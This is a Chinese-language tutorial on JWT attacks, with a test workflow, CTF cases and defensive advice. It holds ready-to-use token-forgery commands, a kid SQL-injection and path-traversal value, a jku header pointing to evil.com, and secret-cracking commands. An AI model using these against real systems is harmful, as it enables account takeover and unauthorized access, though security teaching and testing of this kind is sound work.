# JWT 攻击

## 一句话理解
JWT（JSON Web Token）的安全性完全依赖签名验证。一旦服务端在"算法选择、密钥强度、声明校验"任何一环放松，攻击者就能伪造任意身份的 Token。

## JWT 结构速览
三段式，`.` 分隔，均为 Base64Url 编码：

```text
eyJhbGciOiJIUzI1NiJ9   .   eyJ1c2VyIjoiYWRtaW4ifQ   .   <signature>
       header                    payload                   signature
```

- `header`：`alg`（签名算法）、`typ`、可选 `kid`/`jku`/`x5u`/`jwk`
- `payload`：业务声明，如 `sub`、`role`、`exp`、`iat`、`iss`、`aud`
- `signature`：对前两段的签名，保证完整性

## 核心原理
- 签名只保证"没被改过"，**不保证机密性**，payload 任何人可解码
- 攻击的核心思路只有一个：让服务端接受攻击者构造的 Token
- 常见突破口集中在四点：算法头可控、密钥可猜、头部参数被信任、声明不校验

## 常见攻击面
### 1. `alg=none`
将 header 改为 `{"alg":"none"}`，签名字段留空（注意保留末尾的 `.`）。部分库在校验时跳过签名。

### 2. 算法混淆（RS256 -> HS256）
- 服务端本用 RSA 非对称签名（RS256），公钥通常可获取（JWKS 接口、证书、前端 JS）
- 攻击者把 `alg` 改成 HS256，用**公钥作为 HMAC 密钥**签名
- 如果服务端校验逻辑按 header 里的 alg 选验证方式，就会拿公钥去验 HMAC，伪造成功

### 3. 弱密钥爆破
HS256 的密钥如果是弱口令，可离线爆破：

```bash
hashcat -m 16500 jwt.txt dict.txt
```

常见弱密钥：`secret`、`key`、`123456`、项目名、配置文件里的默认值。

### 4. `kid` 注入
`kid` 用于指定密钥 ID，若服务端直接用其拼接文件路径或 SQL：
- 路径穿越：`"kid":"../../dev/null"` 配合已知内容文件做空密钥签名
- SQL 注入：`"kid":"x' UNION SELECT 'secret'--"`

### 5. `jku` / `x5u` 头注入
header 中的 `jku` 指向 JWKS 地址。若服务端不校验域名白名单，攻击者指向自己服务器上的公钥集，用对应私钥签名即可。常配合 SSRF 或重定向绕过域名校验。

### 6. `jwk` 嵌入公钥攻击
有的服务端验签时**不使用本地存储的公钥**，而是直接读取 token header 中 `jwk`（JSON Web Key）参数内嵌的公钥。攻击者自签一对 RSA 密钥，把公钥塞进 `jwk`，再用对应私钥签名，即可通过校验。

攻击步骤：

```bash
# 1. 生成自签 RSA 私钥（2048 位）
openssl genrsa -out attack_key.pem 2048

# 2. 提取公钥 modulus（十六进制），去掉 "Modulus=" 前缀
openssl rsa -in attack_key.pem -noout -modulus
# 输出: Modulus=ABCDEF123456...

# 3. modulus 由 hex 转 Base64Url（去掉填充 =）
python3 -c "import base64;print(base64.urlsafe_b64encode(bytes.fromhex('ABCDEF...')).decode().rstrip('='))"
# 指数固定为 65537，其 Base64Url 编码即 AQAB
```

伪造的完整 header JSON（`n` 填入上一步的结果）：

```json
{"alg":"RS256","jwk":{"kty":"RSA","kid":"attack","n":"<Base64Url编码的modulus>","e":"AQAB"}}
```

payload 任意构造（如把 `role` 改为 `admin`），用 `attack_key.pem` 对 `header.payload` 做 RS256 签名，拼成完整伪造 token。

jwt_tool 一键完成（自动生成密钥对 + 注入 jwk + 签名）：

```bash
python3 jwt_tool.py <JWT> -X i
```

**与 `kid` 注入的区别：**

| 维度 | `kid` 注入 | `jwk` 嵌入 |
| --- | --- | --- |
| 本质 | "指针"：指向服务端存储的某把密钥 | "内容"：公钥本体直接嵌在 token 里 |
| 攻击面 | 注入点本身（路径穿越/SQL 注入/命令注入） | 无需注入，只要"从 header 取 jwk 验签"的逻辑存在 |
| 攻击者掌握私钥 | 否（密钥仍是服务端那把） | 是（自签密钥对） |
| 同类头 | - | `jku`/`x5u`（远程 URL 指针），攻击面是域名白名单不严 |

### 7. 声明不校验
- 不校验 `exp`：过期 Token 永久有效
- 不校验 `aud`/`iss`：A 系统的 Token 拿到 B 系统用
- 校验顺序错误：先信任 payload 中的 `role` 再做其他处理（逻辑缺陷）

## 快速判断流程
1. 解码 Token，看 `alg`、payload 里有哪些身份字段
2. 改 `alg=none`，看是否被接受
3. 确认算法是 HS 还是 RS；RS 则找公钥，试算法混淆
4. HS256 直接上字典爆破
5. 观察 `kid`/`jku`/`x5u` 是否存在且可控
6. 删掉/篡改签名、过期时间，观察服务端报错差异（泄露校验逻辑）

## 完整攻击流程
承接上面「快速判断流程」，本节给出拿到一个 JWT 后的标准测试顺序，每步附具体 payload / 命令。

**Step 1：Base64 解码，看算法与声明**

```bash
# 手工解码 header / payload（Base64Url 缺填充时需补 =，用 jwt_tool 更省事）
python3 jwt_tool.py <JWT>
```
关注三点：`alg` 是 HS 还是 RS；payload 里有哪些身份字段（`role`/`user`/`admin`）；header 里有没有 `kid`/`jku`/`x5u`/`jwk`。

**Step 2：试 `alg=none`（成本最低，先试）**

```json
{"alg":"none","typ":"JWT"}
```
签名字段置空但**保留末尾的 `.`**；部分实现还要试大小写变体 `None`/`NONE`/`nOnE`。

```bash
python3 jwt_tool.py <JWT> -X a
```

**Step 3：试算法混淆（RS256 -> HS256）**

```bash
# 先找公钥：/.well-known/jwks.json、SSL 证书、前端 JS、robots.txt
# 从证书提取公钥 PEM：
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem
# 用公钥 PEM 原文作为 HMAC 密钥重签：
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
```

**Step 4：HS256 弱密钥爆破**

```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
# 或 hashcat（GPU 加速，见下方 jwt_tool 章节）
```

**Step 5：检查 `kid` / `jku` / `x5u` / `jwk` 头**

```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
{"alg":"HS256","typ":"JWT","jku":"https://evil.com/jwks.json"}
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"attack","n":"...","e":"AQAB"}}
```
三种打法：`kid` 路径穿越/SQL 注入、`jku` 指向攻击者 JWKS、`jwk` 内嵌自签公钥（见攻击面第 4-6 节）。

**Step 6：测 `exp` / `aud` / `iss` 校验**

- 过期 token 原样重放，看是否仍被接受
- 篡改 `exp` 为过去/未来时间、或直接删除 `exp` 字段再签
- 改 `iss`/`aud` 为其他系统的值，观察报错差异（可能暴露多系统共用同一验签密钥）

## 工具
- [jwt_tool](https://github.com/ticarpi/jwt_tool)：一站式测试（alg=none、混淆、爆破、kid 注入）
- [jwt.io](https://jwt.io/)：在线解码调试
- hashcat `-m 16500`、jwt-cracker：离线爆破

## jwt_tool 完整用法
### 安装

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

### 基础解码分析

```bash
python3 jwt_tool.py <JWT>
# 无任何参数即解码：输出 header/payload 内容、算法、密钥信息提示
```

### 全自动化攻击测试（首选）

```bash
# -M at = All Tests：自动轮试 alg=none、算法混淆、空签名等全部攻击
# -t 指定在线目标接口，-rc 带上待测 cookie，-rh 追加自定义请求头
python3 jwt_tool.py <JWT> -M at -t https://target.com/api/user -rh "Authorization: Bearer <JWT>"
```

### 伪造 / 篡改

```bash
# -T：交互式篡改（改 role/uid/exp 等参数，实时切换签名方式）
python3 jwt_tool.py <JWT> -T

# 用已知密钥签名（HS256，密钥为字符串）
python3 jwt_tool.py <JWT> -S hs256 -p "secret_key"

# 用私钥签名（RS256，配合 jwk/jku 注入场景）
python3 jwt_tool.py <JWT> -S rs256 -pr private.pem
```

### 破解密钥

```bash
# -C = crack：对 HS256 密钥做字典爆破
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

### 与 hashcat 联动

```bash
# 先把 token 写入文件，交 hashcat（GPU 加速，适合大字典）
echo "<JWT>" > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt --show   # 查看已破解结果

# 破解出密钥后，回到 jwt_tool 用 -S hs256 -p 重签伪造 token
python3 jwt_tool.py <JWT> -S hs256 -p "cracked_secret"
```

## 案例
### 案例 1：`alg=none` 伪造 admin 读 flag

```text
1. 抓包发现请求头：
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxxx
2. Base64 解码两段：
   header  = {"alg":"HS256","typ":"JWT"}
   payload = {"user":"guest","role":"user"}
3. 访问 /flag 需要 role=admin。先试成本最低的 alg=none：
   header  -> {"alg":"none","typ":"JWT"}
   payload -> {"user":"admin","role":"admin"}
   签名段置空（保留末尾的 .）：
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<新payload的Base64Url>.
4. jwt_tool 一条命令：
   python3 jwt_tool.py <JWT> -X a          # 自动生成 none token
   python3 jwt_tool.py <JWT> -T            # 再交互式把 user/role 改为 admin
5. 携带新 token 请求 /flag，返回 flag{...}
```

### 案例 2：RS256 -> HS256 算法混淆（公钥当 HMAC 密钥）

```text
1. 解码发现 alg=RS256，说明服务端持有一把 RSA 公钥（且大概率能拿到）
2. 找公钥，三个常见来源：
   - JWKS 接口：/.well-known/jwks.json、/jwks、/oauth/discovery/keys
   - SSL 证书公钥
   - 前端 JS / robots.txt 里的硬编码
3. 公钥统一转成 PEM 格式：
   a) 证书直接提取（最简单）：
      openssl s_client -connect target.com:443 2>/dev/null \
        | openssl x509 -pubkey -noout > pubkey.pem
   b) JWKS 里的 n/e 拼 PEM（Python）：
      import base64
      from Crypto.PublicKey import RSA
      n = int.from_bytes(base64.urlsafe_b64decode("<n>=="), 'big')
      e = int.from_bytes(base64.urlsafe_b64decode("AQAB"), 'big')
      key = RSA.construct((n, e))
      open('pubkey.pem','wb').write(key.export_key('PEM'))
4. 把 header 改为 {"alg":"HS256"}，payload 改为 admin，
   用 pubkey.pem 的完整文件内容（含换行）作为 HMAC-SHA256 密钥签名
5. jwt_tool 一条命令完成第 3-4 步：
   python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
6. 常见坑：HMAC 密钥必须与验签实现使用的公钥字节完全一致——
   有的实现取完整 PEM 文本，有的取 DER 原始字节，都试一遍
```

## 防御要点
- 服务端白名单固定算法，忽略 header 中的 `alg` 切换请求
- HS256 密钥保持高强度随机，并支持轮换
- 不信任 `kid`/`jku`/`x5u`/`jwk`，密钥来源写死或严格白名单
- 完整校验 `exp`/`nbf`/`iss`/`aud`
- payload 不放敏感信息，必要时使用 JWE 加密

## 参考
- [PortSwigger JWT attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [jwt_tool - GitHub](https://github.com/ticarpi/jwt_tool)
